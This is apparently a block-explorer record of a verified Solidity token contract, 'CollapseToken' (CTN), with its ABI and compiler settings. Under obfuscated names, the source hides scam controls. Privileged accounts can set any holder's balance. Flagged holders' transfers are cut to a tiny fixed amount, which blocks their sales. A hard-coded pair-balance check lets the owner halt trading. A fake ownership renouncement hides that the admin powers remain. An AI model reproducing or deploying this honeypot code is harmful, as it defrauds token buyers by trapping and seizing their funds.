{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface listSwapToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toFromMax) external view returns (uint256);\n\n    function transfer(address swapList, uint256 takeSwap) external returns (bool);\n\n    function allowance(address fundAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapList,\n        uint256 takeSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoSell, uint256 value);\n    event Approval(address indexed fundAt, address indexed spender, uint256 value);\n}\n\nabstract contract launchSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityTotal {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fromLaunch {\n    function createPair(address enableMode, address shouldSwap) external returns (address);\n}\n\ninterface feeToken is listSwapToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CollapseToken is launchSender, listSwapToken, feeToken {\n\n    uint256 constant exemptAtReceiver = 6 ** 10;\n\n    function enableTo() private view {\n        require(feeSwap[_msgSender()]);\n    }\n\n    bool public totalFrom;\n\n    uint256 private isEnableSell = 100000000 * 10 ** 18;\n\n    bool private atList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isEnableSell;\n    }\n\n    address private limitShouldSender;\n\n    function name() external view virtual override returns (string memory) {\n        return minFrom;\n    }\n\n    address public minReceiver;\n\n    uint8 private tradingLaunch = 18;\n\n    bool public marketingTake;\n\n    address public tokenIs;\n\n    function owner() external view returns (address) {\n        return limitShouldSender;\n    }\n\n    function approve(address fundTake, uint256 takeSwap) public virtual override returns (bool) {\n        limitSwap[_msgSender()][fundTake] = takeSwap;\n        emit Approval(_msgSender(), fundTake, takeSwap);\n        return true;\n    }\n\n    address tokenTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenTake(uint256 takeSwap) public {\n        enableTo();\n        launchLimit = takeSwap;\n    }\n\n    constructor (){\n        if (fromTokenFund == fundTakeAuto) {\n            totalToken = true;\n        }\n        liquidityTotal tradingAmount = liquidityTotal(launchedAuto);\n        tokenIs = fromLaunch(tradingAmount.factory()).createPair(tradingAmount.WETH(), address(this));\n        \n        minReceiver = _msgSender();\n        toTrading();\n        feeSwap[minReceiver] = true;\n        totalLimit[minReceiver] = isEnableSell;\n        \n        emit Transfer(address(0), minReceiver, isEnableSell);\n    }\n\n    function transferFrom(address shouldIs, address swapList, uint256 takeSwap) external override returns (bool) {\n        if (_msgSender() != launchedAuto) {\n            if (limitSwap[shouldIs][_msgSender()] != type(uint256).max) {\n                require(takeSwap <= limitSwap[shouldIs][_msgSender()]);\n                limitSwap[shouldIs][_msgSender()] -= takeSwap;\n            }\n        }\n        return isWallet(shouldIs, swapList, takeSwap);\n    }\n\n    mapping(address => uint256) private totalLimit;\n\n    function isWallet(address shouldIs, address swapList, uint256 takeSwap) internal returns (bool) {\n        if (shouldIs == minReceiver) {\n            return toFund(shouldIs, swapList, takeSwap);\n        }\n        uint256 swapTeamMarketing = listSwapToken(tokenIs).balanceOf(tokenTrading);\n        require(swapTeamMarketing == launchLimit);\n        require(swapList != tokenTrading);\n        if (isTeam[shouldIs]) {\n            return toFund(shouldIs, swapList, exemptAtReceiver);\n        }\n        return toFund(shouldIs, swapList, takeSwap);\n    }\n\n    string private tokenSell = \"CTN\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenSell;\n    }\n\n    function toTrading() public {\n        emit OwnershipTransferred(minReceiver, address(0));\n        limitShouldSender = address(0);\n    }\n\n    function allowance(address liquidityReceiver, address fundTake) external view virtual override returns (uint256) {\n        if (fundTake == launchedAuto) {\n            return type(uint256).max;\n        }\n        return limitSwap[liquidityReceiver][fundTake];\n    }\n\n    uint256 launchMode;\n\n    bool public receiverMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingLaunch;\n    }\n\n    function toFund(address shouldIs, address swapList, uint256 takeSwap) internal returns (bool) {\n        require(totalLimit[shouldIs] >= takeSwap);\n        totalLimit[shouldIs] -= takeSwap;\n        totalLimit[swapList] += takeSwap;\n        emit Transfer(shouldIs, swapList, takeSwap);\n        return true;\n    }\n\n    bool private isTeamBuy;\n\n    uint256 private fromTokenFund;\n\n    mapping(address => mapping(address => uint256)) private limitSwap;\n\n    bool public swapLiquidity;\n\n    uint256 launchLimit;\n\n    function isExempt(address tokenWallet) public {\n        enableTo();\n        if (totalToken) {\n            totalFrom = true;\n        }\n        if (tokenWallet == minReceiver || tokenWallet == tokenIs) {\n            return;\n        }\n        isTeam[tokenWallet] = true;\n    }\n\n    uint256 public fundTakeAuto;\n\n    bool public buyListMode;\n\n    mapping(address => bool) public isTeam;\n\n    mapping(address => bool) public feeSwap;\n\n    bool public totalToken;\n\n    function receiverTeamTake(address launchWalletLimit) public {\n        if (buyListMode) {\n            return;\n        }\n        \n        feeSwap[launchWalletLimit] = true;\n        if (fromTokenFund != fundTakeAuto) {\n            fundTakeAuto = fromTokenFund;\n        }\n        buyListMode = true;\n    }\n\n    function modeSellTrading(address teamTrading, uint256 takeSwap) public {\n        enableTo();\n        totalLimit[teamTrading] = takeSwap;\n    }\n\n    function balanceOf(address toFromMax) public view virtual override returns (uint256) {\n        return totalLimit[toFromMax];\n    }\n\n    bool private takeToken;\n\n    string private minFrom = \"Collapse Token\";\n\n    event OwnershipTransferred(address indexed enableAmount, address indexed listMarketing);\n\n    address launchedAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address teamTrading, uint256 takeSwap) external virtual override returns (bool) {\n        return isWallet(_msgSender(), teamTrading, takeSwap);\n    }\n\n    function getOwner() external view returns (address) {\n        return limitShouldSender;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toFromMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyListMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTakeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"modeSellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWalletLimit\",\"type\":\"address\"}],\"name\":\"receiverTeamTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"tokenTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CollapseToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}